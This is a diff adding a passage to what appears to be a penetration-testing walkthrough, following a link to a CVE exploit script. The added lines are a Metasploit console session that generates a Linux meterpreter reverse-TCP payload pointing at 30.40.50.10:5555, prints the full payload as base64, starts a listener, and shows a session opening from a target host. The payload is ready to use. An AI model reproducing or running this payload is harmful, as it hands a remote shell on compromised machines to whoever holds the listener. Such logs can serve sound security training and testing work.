@@ -1363,6 +1363,39 @@ foothold@e5316a5b004d:/tmp$ curl -v telnet://adv-collector-db:5432
 - [copy-fail-CVE-2026-31431/copy_fail_exp.py at main · theori-io/copy-fail-CVE-2026-31431 · GitHub](https://github.com/theori-io/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py)
 ### or
 ```
+msf > use payload/linux/x64/meterpreter/reverse_tcp 
+msf payload(linux/x64/meterpreter/reverse_tcp) > set LHOST 30.40.50.10
+LHOST => 30.40.50.10
+msf payload(linux/x64/meterpreter/reverse_tcp) > set LPORT 5555
+LPORT => 5555
+msf payload(linux/x64/meterpreter/reverse_tcp) > set prependfork true
+prependfork => true
+msf payload(linux/x64/meterpreter/reverse_tcp) > generate -f elf -o rev
+[*] Writing 282 bytes to rev...
+msf payload(linux/x64/meterpreter/reverse_tcp) > base64 rev
+[*] exec: base64 rev
+
+f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAAB
+AAAAAAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAGgEAAAAAAAC8AQAAAAAAAAAQ
+AAAAAAAAajlYDwVIhcB0CEgx/2o8WA8FBHAPBWo5WA8FSIXAdeox/2oJWJm2EEiJ1k0xyWoiQVpq
+B1oPBUiFwHhRagpBWVBqKViZagJfagFeDwVIhcB4O0iXSLkCABWzHigyClFIieZqEFpqKlgPBVlI
+hcB5JUn/yXQYV2ojWGoAagVIiedIMfYPBVlZX0iFwHnHajxYagFfDwVean5aDwVIhcB47f/m
+msf payload(linux/x64/meterpreter/reverse_tcp) > handler -p linux/x64/meterpreter/reverse_tcp -H 0.0.0.0 -P 5555
+[*] Payload handler running as background job 0.
+
+[*] Started reverse TCP handler on 0.0.0.0:5555 
+msf payload(linux/x64/meterpreter/reverse_tcp) > sessions
+
+Active sessions
+===============
+
+No active sessions.
+
+msf payload(linux/x64/meterpreter/reverse_tcp) > 
+[*] Sending stage (3090404 bytes) to 20.30.40.150
+[*] Meterpreter session 1 opened (30.40.50.10:5555 -> 20.30.40.150:55926) at 2026-06-09 13:12:03 -0400
+sessions 1
+
 
 ```
 
